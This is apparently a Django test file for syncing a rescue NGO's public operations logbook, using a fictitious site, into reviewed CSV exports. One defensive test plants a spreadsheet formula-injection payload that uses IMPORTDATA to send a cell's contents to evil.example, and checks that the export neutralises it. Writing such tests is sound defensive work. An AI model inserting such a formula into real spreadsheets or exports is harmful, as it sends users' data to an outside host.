"""The public logbook read into staging, shown with its evidence and exported for the sheet
(ADR 0014). A fictitious site stands in for sosmediterranee.org; real PostGIS."""

import csv
import io

from django.test import Client

from catalog.crosswalk import approve_link
from catalog.logbook_sync import LOGBOOK_SOURCE_KEY, sheet_last_date, sync_logbook
from catalog.models import LogbookEvidence, SheetSync, Source
from catalog.tests.test_private_api import PrivateApiTestCase
from catalog.tests.test_sheets import ops_csv, ops_row

ORG = "https://www.sosmediterranee.org"
ROTATION = f"{ORG}/operation/operation-12-19-march-2025/"
SITE = {
    f"{ORG}/operation-sitemap.xml": f"<urlset><url><loc>{ROTATION}</loc></url></urlset>",
    f"{ORG}/operation-archived/": f"""
        <article class="loop-item"><a href="{ROTATION}">x</a>
        <span class="loop-item-survivors">65 survivors</span>
        <span class="loop-item-disembarkation">disembarkation: Port fictif</span></article>""",
    ROTATION: """<title>OPERATION 12-19 March 2025 (fictitious) | SOS</title>
        <h2 class="list-term-title contain--lg">March 13, 2025</h2>
        <article class="loop-item loop-item-log"><div class="loop-item-title">
        <span class="loop-item-time">05:10</span>Ocean Viking observes a white rubber boat.</div>
        <div class="loop-item-coordinates">Latitude: 33.5 / Longitude: 12.25</div></article>
        <article class="loop-item loop-item-log"><div class="loop-item-title">
        <span class="loop-item-time">07:00</span>
        Ocean Viking completes the recovery of 40 shipwrecked persons.</div></article>
        <h2 class="list-term-title contain--lg">March 14, 2025</h2>
        <article class="loop-item loop-item-log"><div class="loop-item-title">
        <span class="loop-item-time">12:30</span>
        Ocean Viking completes the recovery of 25 shipwrecked persons.</div></article>""",
}


def fake_site(url):
    return SITE.get(url)


class LogbookSyncTests(PrivateApiTestCase):
    def setUp(self):
        super().setUp()
        # The sheet stops on 6 February 2024, as the real one does.
        self.stage(ops_csv(ops_row(date="06/02/2024")))

    def read(self):
        return sync_logbook(actor=self.reviewer, get=fake_site)

    def test_rebuilds_the_rows_after_the_sheet_with_their_evidence(self):
        self.assertEqual(str(sheet_last_date()), "2024-02-06")
        run = self.read()
        self.assertEqual(run.status, "new_data")
        source = Source.objects.get(key=LOGBOOK_SOURCE_KEY)
        self.assertFalse(source.rights_approved)
        rows = list(run.snapshot.rows.order_by("line"))
        self.assertEqual([row.candidate["nb_survivor"] for row in rows], [40, 25])
        self.assertEqual(rows[0].candidate["Port_disembarkation"], "Port fictif")
        evidence = LogbookEvidence.objects.get(row=rows[0])
        self.assertEqual(evidence.source_url, ROTATION)
        self.assertIn("completes the recovery of 40", evidence.quote)
        # The same logbook read again is not a new update.
        self.assertEqual(self.read().status, "unchanged")
        self.assertEqual(SheetSync.objects.filter(source=source).count(), 2)

    def test_a_site_that_cannot_be_read_is_recorded_not_fatal(self):
        def broken(url):
            raise OSError("down")

        run = sync_logbook(actor=self.reviewer, get=broken)
        self.assertEqual(run.status, "failed")
        self.assertFalse(LogbookEvidence.objects.exists())

    def test_the_team_sees_the_quote_and_can_show_only_the_logbook(self):
        self.read()
        body = self.get(f"preview/events/?source={LOGBOOK_SOURCE_KEY}").json()
        self.assertEqual(body["total_count"], 2)
        first = body["items"][0]
        self.assertEqual(first["source"]["key"], LOGBOOK_SOURCE_KEY)
        self.assertEqual(first["evidence"]["url"], ROTATION)
        self.assertIn("recovery of 25", first["evidence"]["quote"])
        sheet_rows = self.get("preview/events/?source=fixture").json()
        self.assertEqual(sheet_rows["total_count"], 1)
        self.assertIsNone(sheet_rows["items"][0]["evidence"])

    def test_overview_and_export_of_verified_rows_only(self):
        run = self.read()
        overview = self.get("logbook/").json()
        self.assertEqual(
            {key: overview[key] for key in ("rows", "people", "verified", "to_verify")},
            {"rows": 2, "people": 65, "verified": 0, "to_verify": 2},
        )
        self.assertEqual(overview["sheet_last_date"], "2024-02-06")
        response = self.get("logbook/export/")
        self.assertEqual(response["Content-Type"], "text/csv; charset=utf-8")
        self.assertEqual(response.content.decode().count("\n"), 1)  # header only
        approve_link(row=run.snapshot.rows.get(line=2), actor=self.reviewer, reason="Checked")
        lines = self.get("logbook/export/").content.decode().splitlines()
        self.assertEqual(len(lines), 2)
        self.assertTrue(lines[0].startswith("date,type_ops,nb_ops,nb_survivor"))
        self.assertTrue(lines[1].startswith("13/03/2025,Rescue,1,40"))
        self.assertEqual(self.get("logbook/").json()["verified"], 1)

    def test_verified_export_round_trips_the_observed_cartong_contract(self):
        """A fictional reviewed export matches exact CartONG columns and is re-readable."""
        from catalog.logbook import SHEET_HEADER
        from catalog.sheets import diagnose

        run = self.read()
        first = run.snapshot.rows.get(line=2)
        approve_link(row=first, actor=self.reviewer, reason="Approved synthetic entry")
        response = self.get("logbook/export/")
        csv_bytes = response.content
        reader = csv.DictReader(io.StringIO(csv_bytes.decode("utf-8")))
        self.assertEqual(reader.fieldnames, SHEET_HEADER)
        records = list(reader)
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["date"], "13/03/2025")
        self.assertEqual(records[0]["type_ops"], "Rescue")
        self.assertEqual(records[0]["nb_survivor"], "40")
        self.assertEqual(records[0]["latitude"], "33° 30.00")
        self.assertEqual(records[0]["longitude"], "12° 15.00")

        # Re-parse with the same observed contract used for incoming spreadsheets.
        parsed = diagnose(csv_bytes, "Data_operations")
        self.assertEqual(parsed["status"]["source_read"], "complete")
        self.assertEqual(parsed["status"]["normalization"], "needs_review")
        self.assertEqual(parsed["rows"][0]["candidate"]["nb_survivor"], 40)

    def test_rows_the_association_pasted_into_its_sheet_leave_the_export(self):
        # Audit of 25 October 2026: the fixed start must not make SOS paste a row twice.
        run = self.read()
        for row in run.snapshot.rows.all():
            approve_link(row=row, actor=self.reviewer, reason="Checked")
        real = Source.objects.create(key="sos-real", name="SOS sheet", url="https://example.org")
        self.stage(
            ops_csv(ops_row(date="06/02/2024"), ops_row(date="13/03/2025", nb_survivor="40")),
            source=real,
        )
        overview = self.get("logbook/").json()
        self.assertEqual((overview["verified"], overview["in_sheet"], overview["ready"]), (2, 1, 1))
        lines = self.get("logbook/export/").content.decode().splitlines()
        self.assertEqual(len(lines), 2)
        self.assertTrue(lines[1].startswith("14/03/2025,Rescue,1,25"))
        pasted = run.snapshot.rows.get(line=2)
        self.assertEqual(self.get(f"review/rows/{pasted.pk}/").json()["evidence"]["sheet_line"], 3)
        preview = self.get(f"preview/events/?source={LOGBOOK_SOURCE_KEY}").json()["items"]
        self.assertEqual(
            sorted(str(item["evidence"]["sheet_line"]) for item in preview), ["3", "None"]
        )

    def test_a_medical_evacuation_never_reaches_the_sheet(self):
        # CartONG's chart adds nb_survivor without a guard: a row without a number breaks it.
        medevac = """<h2 class="list-term-title contain--lg">March 15, 2025</h2>
            <article class="loop-item loop-item-log"><div class="loop-item-title">
            <span class="loop-item-time">09:00</span>
            Ocean Viking completes the medical evacuation of a survivor.</div></article>"""
        site = {**SITE, ROTATION: SITE[ROTATION] + medevac}
        run = sync_logbook(actor=self.reviewer, get=site.get)
        for row in run.snapshot.rows.all():
            approve_link(row=row, actor=self.reviewer, reason="Checked")
        overview = self.get("logbook/").json()
        self.assertEqual(
            (overview["rows"], overview["ready"], overview["not_for_sheet"]), (3, 2, 1)
        )
        lines = self.get("logbook/export/").content.decode().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertNotIn("Medevac", "\n".join(lines))

    def test_two_bare_rescues_of_the_same_size_can_both_be_verified_and_exported(self):
        # Review of 25 October 2026: equal cells made the second one a blocked "repeat".
        bare = """<h2 class="list-term-title contain--lg">March 13, 2025</h2>
            <article class="loop-item loop-item-log"><div class="loop-item-title">
            <span class="loop-item-time">09:00</span>
            Ocean Viking completes the recovery of 40 shipwrecked persons.</div></article>"""
        archive = SITE[f"{ORG}/operation-archived/"].replace("65 survivors", "80 survivors")
        site = {
            **SITE,
            f"{ORG}/operation-archived/": archive,
            ROTATION: SITE[ROTATION].split('<h2 class="list-term-title contain--lg">March 14')[0]
            + bare,
        }
        run = sync_logbook(actor=self.reviewer, get=site.get)
        rows = list(run.snapshot.rows.order_by("line"))
        self.assertEqual([row.candidate["nb_survivor"] for row in rows], [40, 40])
        self.assertEqual(rows[0].raw_cells, rows[1].raw_cells)
        queue = self.get(f"review/rows/?snapshot={run.snapshot.pk}").json()
        self.assertEqual(queue["counts"], {"to_review": 2, "blocked": 0, "linked": 0})
        for row in rows:
            approve_link(row=row, actor=self.reviewer, reason="Two boats")
        self.assertEqual(len(self.get("logbook/export/").content.decode().splitlines()), 3)

    def test_a_pasted_row_is_counted_once_in_the_figures(self):
        run = self.read()
        real = Source.objects.create(key="sos-real", name="SOS sheet", url="https://example.org")
        self.stage(ops_csv(ops_row(date="13/03/2025", nb_survivor="40")), source=real)
        years = self.get("logbook/").json()["years"]
        self.assertEqual(
            years, [{"year": 2025, "in_sheet": 40, "from_logbook": 25, "reported": 1358}]
        )
        self.assertTrue(run)

    def test_the_verified_row_takes_the_sheet_line(self):
        from catalog.logbook_sync import rows_already_in_sheet

        rotation = (
            SITE[ROTATION]
            .replace("recovery of 25", "recovery of 40")
            .replace("March 14, 2025", "March 13, 2025")
        )
        archive = SITE[f"{ORG}/operation-archived/"].replace("65 survivors", "80 survivors")
        site = {**SITE, ROTATION: rotation, f"{ORG}/operation-archived/": archive}
        run = sync_logbook(actor=self.reviewer, get=site.get)
        first, second = run.snapshot.rows.order_by("line")
        approve_link(row=second, actor=self.reviewer, reason="Checked")
        real = Source.objects.create(key="sos-real", name="SOS sheet", url="https://example.org")
        self.stage(ops_csv(ops_row(date="13/03/2025", nb_survivor="40")), source=real)
        self.assertEqual(list(rows_already_in_sheet(run.snapshot.rows.all())), [second.pk])

    def test_reviewers_only(self):
        self.assertEqual(self.get("logbook/", client=Client()).status_code, 401)
        outsider = Client()
        outsider.force_login(self.outsider)
        self.assertEqual(self.get("logbook/export/", client=outsider).status_code, 403)


class LogbookSafetyTests(PrivateApiTestCase):
    """What the independent review of 24 October 2026 asked to hold."""

    def setUp(self):
        super().setUp()
        self.stage(ops_csv(ops_row(date="06/02/2024")))

    def test_a_bad_reading_never_replaces_the_rows_already_read(self):
        good = sync_logbook(actor=self.reviewer, get=fake_site)
        broken_site = {**SITE, f"{ORG}/operation-sitemap.xml": None}
        bad = sync_logbook(actor=self.reviewer, get=broken_site.get)
        self.assertEqual(bad.status, "failed")
        self.assertEqual(self.get("logbook/").json()["rows"], 2)
        # A rotation page that disappears fails the reading too, rather than shrinking it.
        missing_page = {**SITE, ROTATION: None}
        self.assertEqual(sync_logbook(actor=self.reviewer, get=missing_page.get).status, "failed")
        again = sync_logbook(actor=self.reviewer, get=fake_site)
        self.assertEqual((again.status, again.snapshot_id), ("unchanged", good.snapshot_id))
        self.assertEqual(
            self.get(f"preview/events/?source={LOGBOOK_SOURCE_KEY}").json()["total_count"], 2
        )

    def test_the_export_cannot_carry_a_formula(self):
        hostile = {
            **SITE,
            f"{ORG}/operation-archived/": SITE[f"{ORG}/operation-archived/"].replace(
                "Port fictif", '=IMPORTDATA("https://evil.example/?"&A1)'
            ),
        }
        run = sync_logbook(actor=self.reviewer, get=hostile.get)
        row = run.snapshot.rows.get(line=2)
        # The port is refused at reading; a formula-like cell is also neutralised at export.
        self.assertIsNone(row.candidate["Port_disembarkation"])
        row.raw_cells[1] = "=1+1"
        row.save()
        approve_link(row=row, actor=self.reviewer, reason="Checked")
        lines = self.get("logbook/export/").content.decode().splitlines()
        self.assertIn(",'=1+1,", lines[1])
        self.assertNotIn("IMPORTDATA", "\n".join(lines))

    def test_a_refused_staging_is_recorded_and_changes_nothing(self):
        from unittest import mock

        from django.core.exceptions import ValidationError

        sync_logbook(actor=self.reviewer, get=fake_site)
        with mock.patch(
            "catalog.ingestion.logbook_sync.stage_snapshot", side_effect=ValidationError("refused")
        ):
            run = sync_logbook(actor=self.reviewer, get=fake_site)
        self.assertEqual((run.status, run.message), ("refused", "refused"))
        self.assertEqual(self.get("logbook/").json()["rows"], 2)


class LogbookPresentationTests(PrivateApiTestCase):
    def setUp(self):
        super().setUp()
        self.stage(ops_csv(ops_row(date="06/02/2024")))

    def test_the_verify_screen_carries_the_sentence_and_the_card_the_yearly_check(self):
        run = sync_logbook(actor=self.reviewer, get=fake_site)
        row = run.snapshot.rows.get(line=2)
        detail = self.get(f"review/rows/{row.pk}/").json()
        self.assertIn("completes the recovery of 40", detail["evidence"]["quote"])
        self.assertEqual(detail["evidence"]["rotation"], "2025-03-12/2025-03-19")
        overview = self.get("logbook/").json()
        self.assertEqual(overview["snapshot"], str(run.snapshot.pk))
        self.assertEqual(
            overview["years"],
            [{"year": 2025, "in_sheet": 0, "from_logbook": 65, "reported": 1358}],
        )
        # The fixture source is fictitious: nothing of the sheet counts against SOS's total.
        self.assertEqual(
            overview["cumulative"],
            {
                "as_of": "2026-10-02",
                "reported": 43641,
                "in_sheet": 0,
                "from_logbook": 65,
                "after": 0,
            },
        )
        sync = self.get("sync/").json()["sheets"]
        self.assertIn(LOGBOOK_SOURCE_KEY, {sheet["source_key"] for sheet in sync})
